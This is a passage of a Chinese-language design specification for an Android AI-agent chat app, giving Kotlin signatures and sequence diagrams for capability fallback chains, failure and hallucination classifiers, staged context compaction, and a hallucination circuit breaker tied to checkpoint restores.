    WRITE_L5_SENTINEL_AND_INLINE,  // 写 sentinel + inline 到 user 消息（VISION 成功确认）
    NEXT_CALL_NO_TOOL_DEFS,        // 下一轮 LLM 不传 tools 定义（TOOL 取消）
    NEXT_CALL_REASONING_OFF,       // 下一轮 reasoning=false
    RETRY_NON_STREAM,              // 换非流式重试
    ROLLBACK_TO_BEFORE_USER_MSG,   // 回滚消息到用户输入前
    CONTINUE_WITHOUT_CAPABILITY,   // 不带对应能力继续（如纯文本列附件名）
    STOP_CURRENT_TURN,             // 停止当前轮
    START_NEW_SESSION,             // 强制开新会话（CB OPEN 路径）
    JUMP_TO_PROVIDER_EDITOR,       // 跳设置页
    SWITCH_TO_ANOTHER_PROVIDER     // 切 Provider 提示
}
```

#### 7.2.2 CapabilityDetector

```kotlin
class CapabilityDetector {
    /**
     * 纯函数（无副作用，可单测）：根据用户输入 + 会话状态，判定需要哪些能力。
     * 不读取任何 Repository，只做字符串/内容分析；后续 DegradationChainExecutor 根据
     * chainSpecs.enabled 再过滤实际是否启用。
     */
    fun detect(
        sessionState: AgentSessionState,
        userMessage: AgentMessage,
        activeModelMetadata: ModelMetadata
    ): Set<RequiredCapability> {
        val result = mutableSetOf<RequiredCapability>()

        // VISION：用户输入含 image attachments（ZTH-0 必检，即使 metadata 说不支持也要识别，后续降级出卡）
        if (userMessage.attachments.any { it.isImage }) result += VISION

        // CONTEXT_COMPACTION：历史消息 tokens 超过 L0 阈值（压缩是预处理能力，每轮都判断）
        val estimatedTokens = estimateTokens(sessionState.messages + userMessage)
        val l0Threshold = (activeModelMetadata.contextTokens * 0.8).toInt()
        if (estimatedTokens >= l0Threshold) result += CONTEXT_COMPACTION

        // TOOL_RICH：每轮都有（workflow 会根据实际情况决定是否传 tool_defs，但能力路由层始终包含）
        result += TOOL_RICH

        // REASONING：会话 reasoningEffort != OFF
        if (activeModelMetadata.supportsReasoning) result += REASONING

        // STREAMING_REALTIME：每轮默认流式（除非用户关或 chainSpecs 禁用）
        result += STREAMING_REALTIME

        return result
    }
}
```

#### 7.2.3 FailureClassifier

```kotlin
class FailureClassifier {
    /**
     * 对异常进行三层裁决（证据链累加），返回 FailureClassification。
     * 纯函数：输入 e + context，输出不依赖状态（可单测）。
     */
    fun classify(
        exception: Throwable,
        context: ClassifierContext  // 包含 providerType/model/currentChainDepth/httpStatusCode/responseBody 片段
    ): FailureClassification {
        // Step 1：快速路径（已知 HTTP 状态码 → 直接映射）
        //   429 → RATE_LIMITED_429；5XX → SERVER_ERROR_5XX；401 → INVALID_API_KEY；402/429(quota) → BILLING_QUOTA_EXCEEDED；403 → INSUFFICIENT_SCOPE

        // Step 2：关键字证据匹配（FailureKeywordEvidenceTable 6 大类模糊匹配 + 多语言）
        //   证据链累加，取最高分 FailureClass，再映射 SubClass

        // Step 3：未命中 → UNCLASSIFIED，按命中关键字数量分 LOW_CONFIDENCE（≤1）/ HIGH_CONF_CAPABILITY（≥2）

        // 返回：
        return FailureClassification(
            failureClass = FailureClass.UNCLASSIFIED,
            subClass = FailureSubClass.LOW_CONFIDENCE,
            evidenceChain = listOf(EvidenceMatch(...)),
            actionTableKey = ActionTableKey(...)
        )
    }
}
```

#### 7.2.4 HallucinationClassifier

```kotlin
class HallucinationClassifier {
    /**
     * 对 LLM 原始输出进行幻觉风险评估（不阻塞，快速打分，出卡密度由 scoreDelta 决定）。
     * isCritical = true 时熔断分直接 +∞（OPEN_CRITICAL 永久锁触发）。
     */
    suspend fun assess(
        rawLlmOutput: RawLlmResponse,
        context: AssessmentContext  // 包含 ctxUsagePct/hardConstraintsFromContext/messagesHashChain 等
    ): HallucinationAssessment {
        // 打分维度：
        //   1. 硬约束覆盖：section4 条目覆盖率（低 → +分）
        //   2. 矛盾检测：新输出 vs 已确认 sentinel 硬约束是否矛盾（矛盾 → +150 并标红）
        //   3. 无来源硬约束：L2 section4 无 sourceAnchorId 条目数 > limit → CRITICAL +∞
        //   4. 上下文水位：ctxUsagePct ≥ 85% → +50（幻觉高发区）
        // 映射 CardDensity：
        //   scoreDelta < 10 → INFO；10 ≤ delta < 50 → STANDARD；delta ≥ 50 → DETAILED
        //   isCritical = true → 强制 DETAILED + delta = Int.MAX_VALUE
        return HallucinationAssessment(
            cardDensity = CardDensity.STANDARD,
            scoreDelta = 50,
            extractedHardConstraints = listOf(...),
            isCritical = false
        )
    }
}
```

#### 7.2.5 DegradationChainExecutor 核心执行逻辑

```kotlin
class DegradationChainExecutor(
    private val detector: CapabilityDetector,
    private val failureClassifier: FailureClassifier,
    private val hallucinationClassifier: HallucinationClassifier,
    private val decisionMatrix: ZthDecisionMatrix,
    private val resolverResolver: ResolverResolver,
    private val cardVmFactory: ZthConfirmationCardViewModel.Factory
) {
    /**
     * 对单个 RequiredCapability 执行降级链。
     * - 成功（或用户取消但 workflow 决定继续）：返回 DegradationResult.Success
     * - 失败（或用户取消且 terminalAction 停止）：返回 DegradationResult.Terminal
     * - 任何出卡路径：阻塞式等 cardVm.suspendAwaitUserConfirm() → 写 sentinel → 熔断加分
     */
    suspend fun execute(
        request: DegradationRequest  // capability + originalInputRefs + chainSpec + ctx
    ): DegradationResult {
        var execDepth = 0
        var lastError: Throwable? = null
        var currentResolverIndex = 0

        // execMaxChainDepth = 2（写死，H-INV-2）
        while (execDepth < 2 && currentResolverIndex < request.chainSpec.resolvers.size) {
            val resolverSpec = request.chainSpec.resolvers[currentResolverIndex]
            val callable = resolverResolver.resolveResolver(resolverSpec, request.ctx)
                ?: return skipToNextResolver()  // resolver 不可用（比如用户没设 vision 专用模型）

            val result = runCatching {
                callable.call(request.originalInputs)  // 实际调 LLM（识图/压缩/主模型）
            }

            result.onSuccess { raw ->
                // 幻觉评估
                val assessment = hallucinationClassifier.assess(raw, request.toAssessmentContext())
                val rule = decisionMatrix.lookupOutcomeAssessment(assessment)

                // 熔断加分（如果要出卡）
                return if (rule.mustShowCard) {
                    showCardAndAwait(request, rule, assessment, raw)
                } else {
                    DegradationResult.Success(raw, sentinelId = null)  // 直接放行（如 429 重试成功）
                }
            }

            result.onFailure { e ->
                lastError = e
                val classification = failureClassifier.classify(e, request.toClassifierContext(callable))
                val rule = decisionMatrix.lookupRule(classification)

                // 执行标准动作链（RETRY_T0 / RETRY_T1 / RUN_FALLBACK1 / FORMAT_STRONG_PREFIX / SKIP_TO_CARD）
                for (action in rule.standardActions) {
                    when (action) {
                        RETRY_T0 -> { delay(T0); continue@while /* 同 resolver 重试 */ }
                        RETRY_T1 -> { delay(T1); continue@while }
                        RUN_FALLBACK1 -> { currentResolverIndex++; execDepth++; continue@while /* 切 resolver#2 */ }
                        FORMAT_STRONG_PREFIX -> { request.ctx.extraPrefix = rule.strongPrompt; continue@while }
                        SKIP_TO_CARD -> break  // 直接出卡
                    }
                }

                if (rule.mustShowCard) {
                    return showCardAndAwait(request, rule, assessment = null, rawOutput = null, error = e)
                }
            }
        }

        // 链耗尽，按 terminalAction 处理
        val terminalRule = decisionMatrix.lookupTerminalRule(lastError)
        return DegradationResult.Terminal(terminalRule.terminalActionOnCancel)
    }

    private suspend fun showCardAndAwait(...): DegradationResult {
        val cardVm = cardVmFactory.create(...)
        val outcome = cardVm.suspendAwaitUserConfirm()  // suspendCancellableCoroutine 阻塞
        return when (outcome.state) {
            CONFIRMED -> DegradationResult.Success(outcome.finalContent, outcome.confirmedSentinelId)
            CANCELLED -> DegradationResult.Terminal(outcome.terminalAction)
            ERROR_TERMINATED -> DegradationResult.Terminal(STOP_CURRENT_TURN)
            else -> ...
        }
    }
}
```

### 7.3 第二层：多级保真压缩（类/函数精确签名）

#### 7.3.1 L0SoftCompactor（纯启发式，不调 LLM，4 条自动化断言）

```kotlin
class L0SoftCompactor {
    data class L0Result(
        val messages: List<AgentMessage>,      // 压缩后消息列表
        val tokensSaved: Int,
        val compactedMessageIds: List<String>, // 被压缩的消息（T/M/S 标记用）
        val compactTypePerMessage: Map<String, L0CompactType>,  // TRUNCATE / MERGE_DEDUP / FILE_LOG_MERGE
        val assertionResults: List<L0AssertionResult>,  // 4 条断言结果
        val aborted: Boolean                   // 断言失败 = true，Pipeline 自动升级 L1
    )

    suspend fun execute(
        originalMessages: List<AgentMessage>,
        ctx: CompactionContext,
        params: L0Params
    ): L0Result {
        // 4 种软压缩动作（按消息类型匹配）：
        // 1. TRUNCATE：ToolResultMessage.content > l0_tool_output_min_chars → 截断 + 尾附 [FILE_LOGGER n chars truncated, id=xxx]
        // 2. MERGE_DEDUP：相邻相似 FILE_LOGGER 行（去重 + 保留第一个和最后一个 + 计数 N 行合并）
        // 3. FILE_LOG_MERGE：多条 sendFile 的附件行 → 合并成一条 [附件 n 个：a.txt, b.bin, ...]
        // 4. SUMMARIZE_HEURISTIC：system prompt 中的静态规则（不压缩，保留）

        // 执行完毕后 4 条断言（return 前逐条验证，任何一条失败 aborted=true）：
        // assertion1_hash：L5/L4_refs/L3 序列化后 hash == 原始同集合 hash（字节级一致）
        // assertion2_audit：每条压缩后前缀包含最小审计字段（tool_name + id + exit_code / 合并 id 列表）
        // assertion3_savingPct：tokens 节省比例 >= 10%（否则软压缩无意义，升级 L1）
        // assertion4_noLlm：流程中 LLM SDK 调用次数 == 0
    }
}
```

#### 7.3.2 L1SelectiveCompactor（调 DEDICATED_COMPACT_LLM，JSON Schema 强约束）

```kotlin
class L1SelectiveCompactor(private val resolverResolver: ResolverResolver) {
    data class L1Result(
        val messages: List<AgentMessage>,
        val tokensSaved: Int,
        val segments: List<L1SegmentResult>,   // 对应每个输入段的结果
        val gateResults: List<L1GateResult>,   // 3 条闸门结果
        val aborted: Boolean                   // 闸门失败 → 升级 L2
    )

    // 3 条闸门（不通过 = aborted=true，自动升级 L2）：
    // gate1_segmentIndependence：段数一致 + 顺序一致 + segmentId 完全匹配
    // gate2_auditFieldsRetained：retainedAuditFields ⊇ 输入 minAuditFields（逐项字符串包含）
    // gate3_compressionRatio：每段压缩比在 [5%, 50%] 区间（太小等于没压，太大可能丢内容）

    suspend fun execute(...): L1Result {
        // 1. 把消息按语义切分成 N 段（segment 边界 = 用户消息开头）
        // 2. 组装强约束 prompt：必须只返回 JSON + 段 Schema 定义
        // 3. 调 DEDICATED_COMPACT_LLM resolver
        // 4. 解析 JSON 失败 → RESPONSE_FORMAT_INVALID → 走决策矩阵 → 重试 1 次 → 升级 L2
        // 5. 跑 3 条闸门 → 全过返回，否则 aborted
    }
}
```

#### 7.3.3 L2FullFidelityCompactor（调 DEDICATED_COMPACT_LLM，5 section Schema + 双闸门）

```kotlin
class L2FullFidelityCompactor(private val resolverResolver: ResolverResolver) {
    data class L2Output(
        val section1_userOriginalIntent: List<BulletWithSource>,
        val section2_workProgress: List<PlanProgressItem>,
        val section3_confirmedPlans: List<ConfirmedPlanRef>,       // planId 必须在 DB 存在
        val section4_keyPathsAndConstraints: List<HardConstraintWithSource>, // sourceId 可查
        val section5_notesAndCaveats: List<BulletWithSource>
    )

    data class L2Result(
        val structuredOutput: L2Output,
        val compactionSummaryMessage: AgentMessage,   // 渲染成 L2 压缩标记
        val tokensSaved: Int,
        val totalHardConstraints: Int,                // 「必须保留全集」基数
        val coveredHardConstraints: Int,              // section3 + section4 条目数
        val coveragePct: Float,                       // covered/total
        val gate1Passed: Boolean,                     // 结构完整性 + 引用合法性（不过直接 CRITICAL）
        val gate2Passed: Boolean,                     // 覆盖率 ≥ 阈值
        val unsourcedConstraintsCount: Int,           // section4 无 sourceAnchorId 条目数
        val sourceAnchorMap: Map<String, SourceInfo>  // sourceId → 原始消息详情
    )

    suspend fun execute(...): L2Result {
        // Step 1：调用 DEDICATED_COMPACT_LLM，5 section Schema prompt 强约束
        // Step 2：闸门 1（结构 + 引用）→ 不通过 → TERMINAL + CB +∞ CRITICAL（L2 resolver 幻觉严重）
        // Step 3：闸门 2（覆盖率 ≥ 90%）→ 不通过 → 卡片顶部黄区（LostHardConstraintMatcher 推荐插回位置）
        // Step 4：unsourcedConstraintsCount > ZTH_PARAM_LIMIT → CRITICAL +∞
    }
}
```

#### 7.3.4 LostHardConstraintMatcher（2 阶段打分算法）

```kotlin
class LostHardConstraintMatcher(private val paramsRepository: ZthParamsRepository) {
    /**
     * L2 闸门 2 不通过时，对「丢失的硬约束全集 - 已覆盖集合」计算每个丢失条目的最佳插回位置。
     * 算法确定可复现（单测固定 mock → recoverySuggestedPositionIndex == 预期值 100%）。
     */
    fun matchAll(
        lostConstraints: List<LostHardConstraintItem>,  // 丢失列表
        existingSection4: List<HardConstraintWithSource>, // 当前 section4（按时间戳）
        params: GapMatchParams  // 默认 0.7/0.2/0.1，MANUAL 档可调
    ): Map<String, InsertionSuggestion> {
        // 阶段 A：抽 3 维特征（每个 lost item 对每个 existing slot）
        //   T = 时间差归一化（|lostAnchorTs - slot.ts| / totalSpan）
        //   C = 类型匹配（lost.type == slot.type → 1，否则 0）
        //   L = 来源层匹配（lost.sourceLayer == slot.sourceLayer → 1；跨 0.5 → 0；完全无关 0）
        // 阶段 B：Score = 0.7*T + 0.2*C + 0.1*L
        //   Top1/Top2 候选 + 连续 FILE_PATH ≥3 条 → 直接插块末尾（聚类优先）
        // 返回：lostConstraintId → InsertionSuggestion(suggestedIndex, rationale, topScores)
    }
}
```

#### 7.3.5 ConstraintBidirectionalLinker（正向插回 + 逆向删除双向联动）

```kotlin
class ConstraintBidirectionalLinker(
    private val sentinelDao: UserConfirmedSentinelDao,
    private val checkpointDao: CheckpointDao,
    private val l0RestoreLogDao: L0SoftCompactRestoreLogDao
) {
    // 正向插回：用户在卡片顶部黄区点「插回本条」→ 触发
    // GAP-INV-0：插回条目必须携带原 sourceAnchorId（不变🔴幻觉类）
    // GAP-INV-2：来源消息从「删除/截断」→「保留完整」
    suspend fun onInsertLostConstraintBack(
        item: LostHardConstraintItem,
        cardState: ZthCardState  // 引用 section4 / deletionList / postCompactionMessages
    ): LinkerResult {
        // 1. section4.insert(item.suggestedPos, item.toHardConstraintWithSource())
        //    → 绿色背景 + 默认勾选 + sourceId 全保留（GAP-INV-0）
        // 2. 递归找来源消息：sentinel.originalInputRefs → layer4 messageId
        // 3. 删除清单行：op∈{DELETE,TRUNCATE,MERGE,SUMMARIZE} → state=USER_RECOVERED
        //    → 移动到「已恢复折叠面板」
        // 4. postCompactionMessages[sourceMsgIndex] 从截断/删除 → 恢复完整原文
        //    （字节级 = Checkpoint 元数据 L0/L1 处理前原始 hash）
        // 5. hash 断言：还原后消息 hash == 原始 L0/L1 前 hash（REV-INV-1）
    }

    // 逆向 DEL-2：用户在 section4 中删除一条高风险约束 → 触发
    // Trade-off #12：所有 DEL-2 先弹 Modal；高风险红色 + 2s 冷却 + 承认风险按钮文案
    suspend fun onHardDeleteSection4Constraint(
        entryId: String,
        sourceAnchorId: String,
        sourceLayer: SourceLayer,
        severity: ConstraintSeverity,
        userAcknowledgedRisk: Boolean,  // High Risk Modal 用户点了承认
        cardState: ZthCardState
    ): LinkerResult {
        // 1. 查 Checkpoint 元数据 originalOperationAtCompactTime
        // 2. 按 opType 从 KEPT_FULL → 恢复回原操作类型：
        //    DELETE_WHOLE = 从 postCompactionMessages 删整条
        //    TRUNCATE/MERGE/SUMMARIZE = 内容改回截断版 + 删除清单主区展示
        // 3. tokens 节省计数器 += (beforeSize - afterSize)
        // 4. sentinel.hardConstraintDeletedWithRiskAcknowledged =
        //    (severity == HIGH_RISK) && userAcknowledgedRisk → Audit 表写一行
        // 5. hash 断言：还原后消息 hash == L0/L1 后 hash（正向完全回滚）
    }
}
```

### 7.4 第三层：四方联动状态机（类/函数精确签名）

#### 7.4.1 HallucinationCircuitBreaker（6 态 + LINK-INV-0/4）

```kotlin
enum class FuseState {
    CLOSED,                       // score<60, criticalHits=0
    HALF_OPEN_WARNED,             // 60≤score<120, criticalHits=0 → 卡片顶部黄色警告
    OPEN_NO_CRITICAL,             // score≥120, criticalHits=0 → 横幅黄色
    HALF_OPEN_CRITICAL_PENDING,   // score<120, criticalHits=1 → 下一条确认后可能超
    OPEN_CRITICAL,                // score≥120, criticalHits≥1 → 横幅红色
    OPEN_CRITICAL_PERMANENT       // criticalHits≥2 → App 重启后仍然 OPEN
}

@Singleton
class HallucinationCircuitBreaker @Inject constructor(
    private val sessionDao: ChatSessionDao,
    private val fuseDao: HallucinationFuseDao,
    private val checkpointDao: CheckpointDao,
    private val zthInvariants: AgentZthInvariants
) {
    /** 会话当前熔断状态快照（StatefulAgentWorkflow 每轮开始读取）。 */
    fun getFuseState(sessionId: String): FuseSnapshot

    /**
     * 添加熔断分（ZTH A5 动作）。
     * scoreDelta = Int.MAX_VALUE 表示 CRITICAL +∞。
     * LINK-INV-4：criticalHits n→n+1 时，@Transaction 包裹 4 写（全部成功或全部回滚）：
     *   ① AgentSessionEntity：fuseCriticalHits / state / lastOpenReason → 写
     *   ② HallucinationFuseEntity：n≥2 → permanentlyOpen=true + openEventsLog append
     *   ③ 会话列表刷新 🔴 小红点（sessionDao.touch）
     *   ④ CheckpointDao：立刻保存 type=FUSE_OPEN, hasCriticalHit=true 快照
     */
    @Transaction
    suspend fun addScore(
        sessionId: String,
        scoreDelta: Int,
        isCritical: Boolean,
        triggeringCapability: RequiredCapability,
        triggeringEvidence: String
    ): FuseStateTransition {
        // 1. 读取当前 score/criticalHits
        // 2. 计算新值：newScore = min(score + delta, Int.MAX_VALUE)
        //    newCriticalHits = criticalHits + (if (isCritical) 1 else 0)
        // 3. 新 state 映射（FuseState 跃迁表）
        // 4. 若是 criticalHits n→n+1 → @Transaction 4 写全成功或全回滚
        // 5. state 从非 OPEN → OPEN → 回调 FuseOpenGlobalCoordinator.onFuseOpen()（LINK-INV-2）
        // 6. 返回 FuseStateTransition(oldState, newState, scoreDelta, isCritical)
    }

    /**
     * LINK-INV-0：还原 Checkpoint 后，CB 分数绝对不扣回。
     * 返回 finalScore = max(currentScore, X.fuseScoreAtSave)
     *      finalCriticalHits = max(currentCriticalHits, X.fuseCriticalHitsAtSave)
     * 如果 finalScore < currentScore → 抛 ZthInvariantViolationException 由 LinkInvViolationRecovery 处理
     */
    suspend fun revertToCheckpoint(sessionId: String, checkpoint: CheckpointEntity): FuseSnapshot
}
```

#### 7.4.2 6 LINK-INV 强制迁移执行器

| LINK-INV # | 触发事件 | 执行器类 | 核心函数 |
|---|---|---|---|
| 0 | 还原 Checkpoint | HallucinationCircuitBreaker | `revertToCheckpoint(sessionId, cp)` |
| 1 | Plan Reject（User/Auto） | PlanRejectionSentinelMarker | `markSentinelsForPlanRejection(rejectedPlanId, reason)` |
| 2 | CB → OPEN 三态之一 | FuseOpenGlobalCoordinator | `onFuseOpened(sessionId, newState, reason)` |
| 3 | 确认还原 Checkpoint X（messages 替换前） | CheckpointRevertCoordinator | `prepareForCheckpointRevert(sessionId, cpId)`（先关 Card/Plan 再换 messages） |
| 4 | criticalHits n→n+1 | HallucinationCircuitBreaker（@Transaction 内部） | `addScore(..., isCritical=true)` 4 写事务 |
| 5 | Planner 生成完 Plan（UI 渲染前） | PlanItemSourceAttacher | `attachSourceRefs(planItems, sentinelDao)` |

#### 7.4.3 FuseOpenGlobalCoordinator（LINK-INV-2 横幅 + 自动拒 Plan + 自动 Cancel Card）

```kotlin
@Singleton
class FuseOpenGlobalCoordinator @Inject constructor(
    private val application: Application,
    private val planApprovalManager: PlanApprovalManager
) {
    // 运行时状态：已 attach 的横幅引用（防止重复 attach）
    private val attachedBannerSessionIds = mutableSetOf<String>()
    private val windowManager: WindowManager by lazy {
        application.getSystemService(WINDOW_SERVICE) as WindowManager
    }

    /**
     * CB 跃迁到 OPEN 三态之一时调用。
     * 并行执行 3 件事（LINK-INV-2 强制，终态校验 500ms 后不通过 → 强制开新会话）：
     *  1. WindowManager addView ZthFuseOpenGlobalBanner（无关闭按钮，仅 2 按钮：查看原因 / 开始新会话）
     *  2. 正在 GENERATING/PENDING 的 Plan → status = AUTO_REJECTED_DUE_TO_FUSE_OPEN
     *  3. 所有 pending ZthConfirmationCard → cancelDueToFuseOpen() → Cancelled 状态
     */
    suspend fun onFuseOpened(
        sessionId: String,
        newState: FuseState,
        reason: String
    ) {
        // 1. 横幅 attach（TYPE_APPLICATION_OVERLAY 权限检查，无则降级到 Notification）
        //    OPEN_NO_CRITICAL = 黄色；OPEN_CRITICAL = 红色；PERMANENT = 红底闪烁
        // 2. PlanApprovalManager：若 pendingApproval != null →
        //    resolve(REFINE) + 写 PlanApprovalEntity.rejectedDueToFuseOpen = true
        // 3. 遍历所有 ZthConfirmationCardViewModel 活跃实例 → cancelDueToFuseOpen()
        // 4. 500ms 后校验：Plan 状态不能 pending/generating；Card 聚合态 NO_CARD_PENDING；横幅 attach
        //    不通过 → finish 当前 Activity + 直接强制开新会话（最糟兜底）
    }
}
```

#### 7.4.4 CheckpointRevertCoordinator（LINK-INV-3：messages 替换前先关 Card/Plan）

```kotlin
@Singleton
class CheckpointRevertCoordinator @Inject constructor(
    private val checkpointManager: CheckpointManager,
    private val planApprovalManager: PlanApprovalManager
) {
    /**
     * 用户确认还原 Checkpoint X（messages 替换前先调这个）。
     * 返回 true = 可以继续替换 messages；false = 用户取消还原动作
     */
    suspend fun prepareForCheckpointRevert(
        sessionId: String,
        checkpointId: String
    ): Boolean {
        // 1. 读 X.pendingCardIdsSnapshot + X.pendingPlanApprovalId
        // 2. 所有在快照后新卡片 + 旧 pending 卡片 → cancelDueToCheckpointRevert()
        // 3. 如果 Plan pending → 弹 Modal「还原会拒绝当前计划，确认继续？」
        //    → 用户取消：return false
        //    → 用户确认：resolve(REFINE)（Plan 作废）
        // 4. return true → 外层才真正替换 messages + 同步 restoredL0MessageIds
    }
}
```

#### 7.4.5 LinkInvViolationRecovery（6 类 LINK_INV_VIOLATION 结构化降级）

```kotlin
@Singleton
class LinkInvViolationRecovery {
    enum class ViolationType {
        LINK_INV_0_SCORE_REDUCED,       // 还原后 CB score 居然 < 还原前（违反 max 铁律）
        LINK_INV_1_PREFIX_MISSING,      // Plan Reject 后 Planner prompt 没加 ⚠️ 前缀
        LINK_INV_2_STILL_PENDING,       // CB OPEN 500ms 后仍有 pending Plan/Card
        LINK_INV_3_CARD_STILL_ACTIVE,   // 还原后仍有 pending Card
        LINK_INV_4_TRANSACTION_PARTIAL, // criticalHits 4 写事务部分成功
        LINK_INV_5_SOURCE_EMPTY         // Plan Item factSourceRefs 全空
    }

    enum class RecoverySeverity { WTF, FATAL, ERROR, WARNING }

    data class RecoveryResult(
        val type: ViolationType,
        val severity: RecoverySeverity,
        val actionTaken: String,
        val forceNewSession: Boolean
    )

    /**
     * 在 LINK-INV 断言失败时调用。绝对不抛异常（在线不 Crash），结构化降级 + 上报。
     * WTF 级 = 强制开新会话 + ZTH 横幅闪烁 + 崩溃级上报
     */
    suspend fun recover(violation: ViolationType, context: ViolationContext): RecoveryResult
}
```

### 7.5 ZthFacade 门面模式（StatefulAgentWorkflow 只注入这一个）

```kotlin
@Singleton
class ZthFacade @Inject constructor(
    // ====== 第一层 ======
    val capabilityDetector: CapabilityDetector,
    val chainExecutor: DegradationChainExecutor,
    val failureClassifier: FailureClassifier,
    val hallucinationClassifier: HallucinationClassifier,

    // ====== 第二层 ======
    val compactionPipeline: CompactionPipeline,

    // ====== 第三层 ======
    val circuitBreaker: HallucinationCircuitBreaker,
    val planRejectionMarker: PlanRejectionSentinelMarker,
    val fuseCoordinator: FuseOpenGlobalCoordinator,
    val revertCoordinator: CheckpointRevertCoordinator,
    val sourceAttacher: PlanItemSourceAttacher,
    val linkRecovery: LinkInvViolationRecovery,

    // ====== LLM 消息过滤器 ======
    val messageBuilder: ZthLlmMessageBuilder
) {
    /**
     * ZTH-0/ZTH-1 顶层前置检查：如果当前会话已经是 OPEN_CRITICAL_PERMANENT，
     * 直接返回「拒绝处理，建议开新会话」的 TerminalAction。
     * 在 StatefulAgentWorkflow.processUserTurn 最开头调用。
     */
    suspend fun preflightCheck(sessionId: String): PreflightResult
}
```

---

## 8. 模块间关联图与数据流

### 8.1 主流程时序图（用户发消息 → 模型响应）

```
用户        AIChatPanel    AIAgentViewModel   StatefulAgentWorkflow    ZthFacade        ToolRegistry      LLM API
 │              │                 │                     │                   │                 │              │
 │─ 发送消息 ──▶│                 │                     │                   │                 │              │
 │              │─ processUserInput() ──▶│              │                   │                 │              │
 │              │                 │─ createCheckpoint ──────────────────────────────────────────────│
 │              │                 │─ save message ───▶│                   │                 │              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── preflightCheck ──▶│               │              │
 │              │                 │                     │◀── OK / TERMINAL ───│               │              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── capabilityDetector.detect()          │              │
 │              │                 │                     │  ← Set<RequiredCapability>             │              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── compactionPipeline.compactIfNeeded ──▶│              │
 │              │                 │                     │  [L0/L1/L2 执行 + 可能阻塞出卡]        │              │
 │              │◀── ZthCardShown ────────────────────────────────────────────────────────────────│
 │              │─ 渲染确认卡 ──▶│                     │                   │                 │              │
 │─ 点确认 ────▶│                 │                     │                   │                 │              │
 │              │─ resolveCard ────────────────────────────────────────────▶│                 │              │
 │              │                 │                     │◀── DegradationResult ──│               │              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── chainExecutor.execute(VISION) ──▶│              │
 │              │                 │                     │── chainExecutor.execute(STREAMING) ──▶│              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── messageBuilder.build(messages) ──▶│              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── callLlm ───────────────────────────────────────────▶│
 │              │◀── AssistantDelta ────────────────────────────────────────────────────────────────────────║
 │              │◀── ReasoningDelta ────────────────────────────────────────────────────────────────────────║
 │              │                 │                     │── hallucinationClassifier.assess ──▶│              │
 │              │                 │                     │  [需要出卡？]                                   │              │
 │              │◀── ZthCardShown ──────────────────────────────────────────────────────────────────────── │
 │              │                 │                     │  [卡片阻塞等待...]                                   │              │
 │              │                 │                     │── circuitBreaker.addScore ──▶│                    │
 │              │                 │                     │  [CB 状态变化 → 横幅？]                            │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │── 解析 toolCalls ────────────▶│              │
 │              │◀── ToolCallStarted ──────────────────────────────────────────────────│              │
 │              │                 │                     │── executeTool ─────────────▶│              │
 │              │◀── ToolCallFinished ─────────────────────────────────────────────────│              │
 │              │                 │                     │                   │                 │              │
 │              │                 │                     │◀── ToolResult ────────────────────────│              │
 │              │                 │                     │── 下一轮 LLM 循环（直到迭代 max / finish）      │
 │              │                 │                     │                   │                 │              │
 │              │◀── Result(SUCCESS) ────────────────────│               │                 │              │
```

### 8.2 失败降级路径时序图（VISION_UNSUPPORTED 触发）

```
主模型 LLM        FailureClassifier   ZthDecisionMatrix   DegradationChainExecutor   ZthCardVM   用户
      │                │                    │                      │                  │         │
      │─ ERROR 400 ───▶│                    │                      │                  │         │
      │  "image_url    │                    │                      │                  │         │
      │   not          │                    │                      │                  │         │
      │   supported"   │                    │                      │                  │         │
      │                │─ classify(e) ─────▶│                      │                  │         │
      │                │  (FailureClass:    │                      │                  │         │
      │                │   CAPABILITY_      │                      │                  │         │
      │                │   UNSUPPORTED,     │                      │                  │         │
      │                │   SubClass:        │                      │                  │         │
      │                │   VISION_          │                      │                  │         │
      │                │   UNSUPPORTED)     │                      │                  │         │
      │                │                    │─ lookupRule() ──────▶│                  │         │
      │                │                    │                      │                  │         │
      │                │                    │   (standardActions:  │                  │         │
      │                │                    │    RUN_FALLBACK1,    │                  │         │
      │                │                    │    mustShowCard=true,│                  │         │
      │                │                    │    delta=打分决定,    │                  │         │
      │                │                    │    density=打分,     │                  │         │
      │                │                    │    terminalAction=   │                  │         │
      │                │                    │     INLINE_TO_USER)  │                  │         │
      │                │                    │                      │                  │         │
      │                │                    │                      │─ RUN_FALLBACK1   │         │
      │                │                    │                      │   (Resolver #2)  │         │
      │                │                    │                      │   DEDICATED_     │         │
      │                │                    │                      │   VISION_LLM)    │         │
      │                │                    │                      │─ 识图成功？──────┤         │
      │                │                    │                      │       │          │         │
      │                │                    │                      │      Yes         │         │
      │                │                    │                      │       │          │         │
      │                │                    │                      │─ Hallucination   │         │
      │                │                    │                      │   Classifier.assess│        │
      │                │                    │                      │       ↓          │         │
      │                │                    │                      │─ createCardVM ─▶│         │
      │                │                    │                      │   (STANDARD 密度)│         │
      │                │                    │                      │─ suspendAwait ──│         │
      │                │                    │                      │                  │─ 渲染卡 ─▶│
      │                │                    │                      │                  │         │
      │                │                    │                      │                  │◀─ 点确认 ─│
      │                │                    │                      │  ← DegradationResult.Success│
      │                │                    │                      │  (finalContent, sentinelId) │
      │                │                    │                      │─ write sentinel (L5) │       │
      │                │                    │                      │─ addScore(CB)    │         │
      │                │                    │                      │─ messageBuilder  │         │
      │                │                    │                      │   inline L5→user 消息       │
      │                │                    │                      │                  │         │
      │◀──────────────── 下一轮主模型使用纯文本摘要（无图片），继续执行 ────────────────────────── │
```

### 8.3 ZTH 四方联动数据流（LINK-INV 0~5 强制迁移）

```
                          ┌──────────────────────────────┐
                          │  UserConfirmedSentinel (L5) │
                          │   - confirmsOf              │
                          │   - finalContent            │
                          │   - hardConstraints         │
                          │   - planRejectedCount       │
                          └─────────────┬────────────────┘
                                        │
                                        │ LINK-INV-1 (Plan Reject)
                                        │ 写 SentinelPlanRejectionAudit
                                        │ + ⚠️前缀注入 Planner
                                        ▼
┌─────────────────────┐      ┌──────────────────────┐      ┌─────────────────────┐
│ Hallucination       │─────▶│ PlanApprovalManager  │─────▶│ Checkpoint &        │
│ CircuitBreaker      │ LINK │   (pending Plan)     │ LINK │ Messages Restore    │
│  (6 FuseState)      │ -2   │                      │ -3   │ (pendingCardIds,    │
